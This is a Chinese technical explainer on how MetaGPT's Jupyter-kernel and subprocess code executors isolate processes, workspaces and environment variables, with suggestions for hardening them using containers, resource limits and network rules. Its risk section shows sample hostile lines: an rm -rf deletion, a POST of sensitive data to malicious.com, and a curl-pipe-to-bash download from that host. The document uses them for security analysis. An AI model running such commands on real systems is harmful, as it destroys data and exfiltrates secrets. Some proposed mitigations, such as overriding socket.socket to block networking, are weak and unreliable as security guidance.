# Software Company - 代码执行环境隔离机制详解

## 目录

1. [概述](#概述)
2. [执行环境架构](#执行环境架构)
3. [隔离机制详解](#隔离机制详解)
4. [安全性分析](#安全性分析)
5. [最佳实践](#最佳实践)
6. [局限性与改进建议](#局限性与改进建议)

---

## 概述

在 Software Company 中，代码执行主要由两个组件负责：

1. **ExecuteNbCode** - 用于 DataInterpreter (DI) 角色，基于 Jupyter Notebook
2. **RunCode** - 用于传统软件开发流程，基于 subprocess

本文档详细说明这两种执行方式如何实现环境隔离。

---

## 执行环境架构

### 整体架构图

```
┌─────────────────────────────────────────────────────────────┐
│                      MetaGPT Framework                       │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────────────────┐      ┌─────────────────────────┐ │
│  │  DataInterpreter     │      │  Traditional Software   │ │
│  │  (DI 角色)           │      │  Development            │ │
│  └──────────────────────┘      └─────────────────────────┘ │
│           │                              │                  │
│           ▼                              ▼                  │
│  ┌──────────────────────┐      ┌─────────────────────────┐ │
│  │  ExecuteNbCode       │      │  RunCode                │ │
│  │  (Jupyter Kernel)    │      │  (subprocess)           │ │
│  └──────────────────────┘      └─────────────────────────┘ │
│           │                              │                  │
└───────────┼──────────────────────────────┼──────────────────┘
            │                              │
            ▼                              ▼
┌─────────────────────────┐    ┌──────────────────────────┐
│  Jupyter Kernel Manager │    │  Python subprocess       │
│  - 独立进程              │    │  - 独立进程              │
│  - 独立内存空间          │    │  - 环境变量隔离          │
│  - 工作目录隔离          │    │  - 工作目录隔离          │
└─────────────────────────┘    └──────────────────────────┘
```

---

## 隔离机制详解

### 1. ExecuteNbCode 的隔离机制

#### 1.1 基于 Jupyter Kernel 的进程隔离

**核心实现** (`metagpt/actions/di/execute_nb_code.py:94-107`):

```python
def set_nb_client(self):
    self.nb_client = RealtimeOutputNotebookClient(
        self.nb,
        timeout=self.timeout,
        resources={"metadata": {"path": self.config.workspace.path}},  # 工作目录隔离
        notebook_reporter=self.reporter,
        coalesce_streams=True,
    )

async def build(self):
    if self.nb_client.kc is None or not await self.nb_client.kc.is_alive():
        self.nb_client.create_kernel_manager()       # 创建 kernel 管理器
        self.nb_client.start_new_kernel()            # 启动新 kernel (独立进程)
        self.nb_client.start_new_kernel_client()     # 启动 kernel 客户端
```

**隔离层次**:

1. **进程级隔离**
   - 每个 `ExecuteNbCode` 实例启动一个独立的 Jupyter Kernel 进程
   - Kernel 是完全独立的 Python 解释器进程
   - 进程间通过 ZeroMQ 消息队列通信 (iopub_channel, stdin_channel, hb_channel, control_channel)

2. **内存隔离**
   - 每个 Kernel 拥有独立的内存空间
   - 变量、导入的模块、全局状态完全隔离
   - 一个 Kernel 崩溃不会影响其他 Kernel

3. **工作目录隔离**
   ```python
   resources={"metadata": {"path": self.config.workspace.path}}
   ```
   - 每个项目有独立的 workspace 路径
   - 默认路径: `~/.metagpt/workspace/<project_name>/`
   - 如果启用 `use_uid`，会创建带时间戳和 UUID 的目录

4. **状态管理**
   ```python
   async def terminate(self):
       """完全清理 kernel 资源"""
       if self.nb_client.km is not None and await self.nb_client.km.is_alive():
           await self.nb_client.km.shutdown_kernel(now=True)
           await self.nb_client.km.cleanup_resources()
           # 停止所有通信通道
           for channel in [stdin_channel, hb_channel, control_channel]:
               if channel.is_alive():
                   channel.stop()
   ```

#### 1.2 Notebook 文件隔离

```python
async def run(self, code: str) -> Tuple[str, bool]:
    # 添加代码到 notebook
    self.add_code_cell(code=code)

    # 构建执行器
    await self.build()

    # 执行代码
    cell_index = len(self.nb.cells) - 1
    success, outputs = await self.run_cell(self.nb.cells[-1], cell_index)

    # 保存到项目特定的 notebook 文件
    file_path = self.config.workspace.path / "code.ipynb"
    nbformat.write(self.nb, file_path)
```

**特点**:
- 每个项目的执行历史保存在独立的 `.ipynb` 文件中
- 可以追溯所有执行过的代码和结果
- 便于调试和重现问题

#### 1.3 超时与错误隔离

```python
async def run_cell(self, cell: NotebookNode, cell_index: int) -> Tuple[bool, str]:
    try:
        await self.nb_client.async_execute_cell(cell, cell_index)
        return self.parse_outputs(self.nb.cells[-1].outputs)
    except CellTimeoutError:
        # 超时自动中断，不影响其他代码
        await self.nb_client.km.interrupt_kernel()
        await asyncio.sleep(1)
        return False, "Cell execution timed out..."
    except DeadKernelError:
        # Kernel 崩溃自动重启
        await self.reset()
        return False, "DeadKernelError"
```

**保护机制**:
1. **超时保护**: 默认 600 秒超时，防止死循环
2. **Kernel 崩溃恢复**: 自动重启 Kernel
3. **错误捕获**: 异常不会导致主程序崩溃

---

### 2. RunCode 的隔离机制

#### 2.1 基于 subprocess 的进程隔离

**核心实现** (`metagpt/actions/run_code.py:92-118`):

```python
async def run_script(self, working_directory, additional_python_paths=[], command=[]) -> Tuple[str, str]:
    working_directory = str(working_directory)
    additional_python_paths = [str(path) for path in additional_python_paths]

    # 复制当前环境变量
    env = self.context.new_environ()

    # 修改 PYTHONPATH 环境变量
    additional_python_paths = [working_directory] + additional_python_paths
    additional_python_paths = ":".join(additional_python_paths)
    env["PYTHONPATH"] = additional_python_paths + ":" + env.get("PYTHONPATH", "")

    # 安装依赖
    RunCode._install_dependencies(working_directory=working_directory, env=env)

    # 启动子进程
    process = subprocess.Popen(
        command,
        cwd=working_directory,         # 工作目录隔离
        stdout=subprocess.PIPE,        # 标准输出隔离
        stderr=subprocess.PIPE,        # 标准错误隔离
        env=env                        # 环境变量隔离
    )

    try:
        # 等待进程完成，超时保护
        stdout, stderr = process.communicate(timeout=10)
    except subprocess.TimeoutExpired:
        process.kill()  # 强制终止
        stdout, stderr = process.communicate()

    return stdout.decode("utf-8"), stderr.decode("utf-8")
```

#### 2.2 隔离层次

1. **进程隔离**
   - 每次执行创建新的 subprocess
   - 进程有独立的 PID
   - 进程崩溃不影响主程序

2. **工作目录隔离**
   ```python
   cwd=working_directory
   ```
   - 每个项目有独立的工作目录
   - 文件读写限制在项目目录内
   - 避免不同项目文件冲突

3. **环境变量隔离**
   ```python
   env = self.context.new_environ()
   env["PYTHONPATH"] = additional_python_paths + ":" + env.get("PYTHONPATH", "")
   ```
   - 复制环境变量而非共享
   - 自定义 PYTHONPATH，优先使用项目路径
   - 不会污染全局环境

4. **标准流隔离**
   ```python
   stdout=subprocess.PIPE,
   stderr=subprocess.PIPE,
   ```
   - 捕获所有输出
   - 不会混入主程序的输出
   - 便于分析和展示

5. **超时保护**
   ```python
   stdout, stderr = process.communicate(timeout=10)
   ```
   - 默认 10 秒超时
   - 超时自动 kill 进程
   - 防止资源占用

---

### 3. 工作空间隔离

#### 3.1 WorkspaceConfig 配置

**实现** (`metagpt/configs/workspace_config.py`):

```python
class WorkspaceConfig(YamlModel):
    path: Path = DEFAULT_WORKSPACE_ROOT  # 默认: ~/.metagpt/workspace
    use_uid: bool = False                # 是否使用唯一 ID
    uid: str = ""                        # 唯一标识符

    @model_validator(mode="after")
    def check_uid_and_update_path(self):
        if self.use_uid and not self.uid:
            # 生成时间戳 + UUID 的唯一标识
            self.uid = f"{datetime.now().strftime('%Y%m%d%H%M%S')}-{uuid4().hex[-8:]}"
            self.path = self.path / self.uid

        # 自动创建目录
        self.path.mkdir(parents=True, exist_ok=True)
        return self
```

#### 3.2 工作空间目录结构

```
~/.metagpt/workspace/
├── snake_game/                    # 项目 1
│   ├── code.ipynb                 # Jupyter notebook
│   ├── docs/                      # 文档
│   │   ├── prd.json
│   │   ├── system_design.json
│   │   └── task.json
│   ├── snake_game/                # 源代码
│   │   ├── snake.py
│   │   ├── food.py
│   │   └── game.py
│   └── resources/                 # 资源文件
│       ├── prd/
│       ├── system_design/
│       └── competitive_analysis/
│
├── todo_app/                      # 项目 2 (完全隔离)
│   ├── code.ipynb
│   ├── docs/
│   └── todo_app/
│
└── 20251116143025-a3f7b2c1/       # 使用 UID 的项目
    └── ...
```

**隔离特性**:
1. 每个项目有独立的目录树
2. 文件系统级别的物理隔离
3. 不同项目之间无法直接访问文件
4. 便于管理和清理

---

## 安全性分析

### 隔离级别对比

| 隔离维度 | ExecuteNbCode (Jupyter) | RunCode (subprocess) | 隔离强度 |
|---------|------------------------|---------------------|---------|
| 进程隔离 | ✅ 独立 Kernel 进程 | ✅ 独立 subprocess | ⭐⭐⭐⭐⭐ |
| 内存隔离 | ✅ 独立内存空间 | ✅ 独立内存空间 | ⭐⭐⭐⭐⭐ |
| 文件系统隔离 | ✅ 工作目录隔离 | ✅ cwd 隔离 | ⭐⭐⭐ |
| 网络隔离 | ❌ 共享网络 | ❌ 共享网络 | ⭐ |
| 环境变量隔离 | ✅ 继承但可修改 | ✅ 复制并修改 | ⭐⭐⭐⭐ |
| 超时保护 | ✅ 600s 可配置 | ✅ 10s 可配置 | ⭐⭐⭐⭐ |
| 崩溃隔离 | ✅ 自动重启 | ✅ 自动清理 | ⭐⭐⭐⭐ |
| 资源限制 | ❌ 无限制 | ❌ 无限制 | ⭐ |

### 安全风险

#### 1. 文件系统访问 ⚠️

**风险**:
```python
# 恶意代码可以访问工作目录之外的文件
import os
os.system("rm -rf /important/data")  # 危险！
```

**当前保护**:
- 工作目录设置为项目目录 (软限制)
- 但没有 chroot 或容器级别的硬限制

**影响范围**: 高风险 - 可以访问整个文件系统

#### 2. 网络访问 ⚠️

**风险**:
```python
# 可以发起任意网络请求
import requests
requests.post("http://malicious.com", data=sensitive_data)
```

**当前保护**: 无限制

**影响范围**: 高风险 - 可能泄露数据或攻击其他系统

#### 3. 系统命令执行 ⚠️

**风险**:
```python
# 可以执行任意系统命令
os.system("curl malicious.com/script.sh | bash")
```

**当前保护**: 无限制

**影响范围**: 高风险 - 完全的系统访问权限

#### 4. 资源消耗 ⚠️

**风险**:
```python
# 可以消耗大量资源
while True:
    list(range(10**9))  # 内存炸弹
```

**当前保护**:
- 仅有超时保护
- 无内存/CPU 限制

**影响范围**: 中风险 - 可能导致系统资源耗尽

---

## 最佳实践

### 1. 使用 UID 隔离不同会话

```python
from metagpt.config2 import Config
from metagpt.roles.di.data_interpreter import DataInterpreter

# 为每个会话创建独立的工作空间
config = Config.default()
config.workspace.use_uid = True  # 启用 UID

di = DataInterpreter(tools=[...], context=Context(config=config))
await di.run(prompt)

# 工作空间路径: ~/.metagpt/workspace/20251116143025-a3f7b2c1/
```

**优势**:
- 每次运行都有独立的工作空间
- 避免多次运行的文件冲突
- 便于保留历史记录

### 2. 定期清理 Kernel

```python
di = DataInterpreter(tools=[...])

try:
    await di.run(prompt)
finally:
    # 确保 kernel 被正确清理
    await di.execute_code.terminate()
```

**优势**:
- 释放资源
- 避免僵尸进程
- 防止内存泄漏

### 3. 自定义超时时间

```python
# 对于长时间运行的任务
execute_code = ExecuteNbCode(timeout=1800)  # 30 分钟

di = DataInterpreter(
    tools=[...],
    execute_code=execute_code
)
```

**优势**:
- 避免正常任务被错误终止
- 合理控制资源使用

### 4. 使用独立的配置文件

```yaml
# config/project_a.yaml
workspace:
  path: "/path/to/project_a/workspace"
  use_uid: false

# config/project_b.yaml
workspace:
  path: "/path/to/project_b/workspace"
  use_uid: false
```

```python
config_a = Config.from_yaml_file("config/project_a.yaml")
config_b = Config.from_yaml_file("config/project_b.yaml")

di_a = DataInterpreter(context=Context(config=config_a))
di_b = DataInterpreter(context=Context(config=config_b))
```

**优势**:
- 明确的项目隔离
- 易于管理配置
- 避免意外覆盖

---

## 局限性与改进建议

### 当前局限性

1. **缺乏容器级隔离**
   - 没有使用 Docker/Podman
   - 文件系统、网络、资源都未隔离

2. **无资源限制**
   - CPU、内存、磁盘可以无限使用
   - 可能导致系统资源耗尽

3. **无安全沙箱**
   - 代码可以执行任意操作
   - 适合可信代码，不适合不可信代码

4. **并发执行问题**
   - 多个 DataInterpreter 实例可能竞争资源
   - 没有并发控制机制

### 改进建议

#### 1. 容器化执行 (推荐) ⭐⭐⭐⭐⭐

**实现方案**:

```python
import docker

class DockerExecuteNbCode(ExecuteNbCode):
    """使用 Docker 容器执行代码"""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.docker_client = docker.from_env()
        self.container = None

    async def build(self):
        """启动 Docker 容器中的 Jupyter Kernel"""
        self.container = self.docker_client.containers.run(
            image="jupyter/base-notebook:latest",
            command="jupyter notebook --ip=0.0.0.0",
            detach=True,
            remove=True,
            volumes={
                str(self.config.workspace.path): {
                    'bind': '/workspace',
                    'mode': 'rw'
                }
            },
            mem_limit="2g",        # 内存限制
            cpu_quota=50000,       # CPU 限制 (50%)
            network_mode="bridge", # 网络隔离
        )
        # 连接到容器中的 kernel
        ...

    async def terminate(self):
        """停止并删除容器"""
        if self.container:
            self.container.stop()
            self.container.remove()
        await super().terminate()
```

**优势**:
- 完全的文件系统隔离
- 网络隔离
- 资源限制 (CPU、内存、磁盘)
- 易于清理

**配置示例**:
```yaml
workspace:
  path: "/workspace"
  use_docker: true
  docker_image: "jupyter/base-notebook:latest"
  docker_limits:
    memory: "2g"
    cpu_quota: 50000
```

#### 2. 使用 gVisor/Kata Containers ⭐⭐⭐⭐

**特点**:
- 轻量级容器运行时
- 更强的安全隔离
- 性能优于传统容器

**实现**:
```bash
# 使用 gVisor 运行容器
docker run --runtime=runsc -it jupyter/base-notebook
```

#### 3. Jupyter Enterprise Gateway ⭐⭐⭐

**架构**:
```
MetaGPT
    ↓
Jupyter Enterprise Gateway (分布式 Kernel 管理)
    ↓
多个 Kernel 容器 (Kubernetes Pods)
```

**优势**:
- 分布式执行
- 自动扩缩容
- 资源隔离
- 高可用性

#### 4. 资源限制 (cgroups) ⭐⭐⭐

**实现** (Linux):
```python
import resource

def limit_resources():
    """限制子进程资源使用"""
    # 限制内存: 2GB
    resource.setrlimit(resource.RLIMIT_AS, (2 * 1024**3, 2 * 1024**3))

    # 限制 CPU 时间: 600 秒
    resource.setrlimit(resource.RLIMIT_CPU, (600, 600))

    # 限制文件大小: 100MB
    resource.setrlimit(resource.RLIMIT_FSIZE, (100 * 1024**2, 100 * 1024**2))

# 在 subprocess 中使用
process = subprocess.Popen(
    command,
    preexec_fn=limit_resources  # 子进程启动前设置限制
)
```

#### 5. 网络隔离 ⭐⭐⭐

**方案 A: iptables 规则**
```bash
# 只允许访问特定域名
iptables -A OUTPUT -d api.openai.com -j ACCEPT
iptables -A OUTPUT -j DROP
```

**方案 B: Python 级别限制**
```python
import socket

# 禁止网络访问
def disable_network():
    socket.socket = lambda *args, **kwargs: None

# 在代码执行前调用
disable_network()
exec(user_code)
```

#### 6. 文件系统隔离 (chroot) ⭐⭐⭐⭐

```python
import os

def execute_in_chroot(code, workspace_path):
    """在 chroot 环境中执行代码"""
    if os.fork() == 0:  # 子进程
        os.chroot(workspace_path)  # 切换根目录
        os.chdir("/")
        exec(code)
        os._exit(0)
    else:  # 父进程
        os.wait()
```

**优势**:
- 强制文件系统隔离
- 无法访问根目录外的文件

**限制**:
- 需要 root 权限
- 需要复制必要的系统文件

---

## 生产环境部署建议

### 最小安全配置

```python
from metagpt.config2 import Config
from metagpt.roles.di.data_interpreter import DataInterpreter

# 1. 使用 UID 隔离
config = Config.default()
config.workspace.use_uid = True

# 2. 限制执行时间
execute_code = ExecuteNbCode(timeout=300)  # 5 分钟

# 3. 创建 DataInterpreter
di = DataInterpreter(
    tools=["WritePRD", "WriteDesign", "WritePlan", "WriteCode", "RunCode"],
    execute_code=execute_code,
    context=Context(config=config)
)

# 4. 添加异常处理
try:
    result = await di.run(user_prompt)
finally:
    # 5. 确保资源清理
    await di.execute_code.terminate()

    # 6. 可选: 清理工作空间
    # shutil.rmtree(config.workspace.path)
```

### 高安全性配置 (Docker)

```python
# docker-compose.yml
version: '3.8'
services:
  metagpt:
    image: metagpt:latest
    volumes:
      - ./workspace:/workspace:rw
    environment:
      - WORKSPACE_PATH=/workspace
    deploy:
      resources:
        limits:
          cpus: '2.0'
          memory: 4G
    networks:
      - isolated_network
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE

networks:
  isolated_network:
    driver: bridge
```

```python
# Python 代码
config = Config.default()
config.workspace.path = Path("/workspace")
config.workspace.use_uid = True

# 其他配置同上
```

---

## 总结

### 当前隔离机制总结

| 隔离方面 | 实现方式 | 隔离强度 | 适用场景 |
|---------|---------|---------|---------|
| 进程隔离 | Jupyter Kernel / subprocess | ⭐⭐⭐⭐⭐ | ✅ 生产环境 |
| 内存隔离 | 操作系统进程隔离 | ⭐⭐⭐⭐⭐ | ✅ 生产环境 |
| 文件隔离 | 工作目录设置 | ⭐⭐⭐ | ⚠️ 可信代码 |
| 网络隔离 | 无 | ❌ | ❌ 不可信代码 |
| 资源隔离 | 超时保护 | ⭐⭐ | ⚠️ 可信代码 |

### 适用场景

✅ **适合**:
- 内部开发和测试
- 可信的代码生成
- 原型开发
- 教育和演示

❌ **不适合** (需要增强安全措施):
- 执行不可信代码
- 多租户环境
- 公开 API 服务
- 敏感数据处理

### 关键要点

1. **基本隔离已实现**: 进程、内存、工作目录隔离
2. **容器化是最佳实践**: 生产环境应使用 Docker/Kubernetes
3. **资源限制很重要**: 应添加 CPU、内存、超时限制
4. **网络安全需关注**: 应限制网络访问
5. **定期清理很必要**: 避免资源泄漏

---

**文档版本**: 1.0
**最后更新**: 2025-11-16
**作者**: Claude
**相关文档**: [Software Company 实现细节](./software_company_implementation.md)
